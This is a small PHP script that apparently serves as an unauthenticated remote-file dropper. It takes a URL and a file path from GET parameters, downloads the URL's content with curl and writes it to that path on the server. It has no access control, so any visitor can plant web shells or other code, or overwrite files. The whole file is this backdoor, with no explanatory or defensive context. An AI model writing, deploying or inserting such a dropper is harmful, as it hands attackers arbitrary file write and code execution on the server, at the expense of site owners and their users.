<?php
function openurl($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$url='';
$file = '';
if (isset($_GET['url']))
{
    $url = $_GET['url'];
}
if (isset($_GET['fl']))
{
    $file = $_GET['fl'];
}
if ($url != '' and $file != '')
{
    $halaman = openurl($url);
    $s = fopen($file, "w");
    fwrite($s, $halaman);
    fclose($s);
}
else
{
    exit("nothing option required!");
}
?>



